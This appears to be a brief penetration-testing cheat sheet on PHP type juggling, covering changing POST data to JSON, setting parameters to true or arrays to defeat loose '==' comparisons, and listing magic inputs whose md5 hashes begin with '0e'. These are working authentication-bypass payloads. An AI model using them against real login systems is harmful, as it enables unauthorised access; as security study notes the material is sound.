# php type juggling

## methodology
### http post data
- change content type to JSON and try different types for params
  - target things that might be compared with `==` and try changing them to `true`
- brackets -> arrays

## string and number exponent type confusion
### vulnerable hash prefix `0e` md5 sha1
`0e`
specific password payloads that generate md5 hashes are in payloadsallthethings "Type Juggling"
```bash
$ echo -n 240610708 | md5sum
0e462097431906509019562988736854  -
$ echo -n QNKCDZO | md5sum
0e830400451993494058024219903391  -
$ echo -n aabg7XSs | md5sum
0e087386482136013740957780965295  -
```
